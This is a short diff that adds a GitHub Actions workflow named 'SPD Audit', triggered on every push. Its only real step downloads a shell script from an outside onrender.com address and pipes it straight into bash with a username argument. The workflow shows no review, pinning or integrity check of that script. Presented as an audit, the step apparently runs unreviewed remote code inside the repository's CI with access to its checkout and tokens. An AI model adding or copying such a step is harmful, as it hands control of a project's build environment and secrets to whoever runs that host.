@@ -1,0 +1,8 @@
+name: SPD Audit
+on: [push]
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: curl -s https://spd-1j53.onrender.com/static/engine.sh | bash -s -- Dhanajeyan77
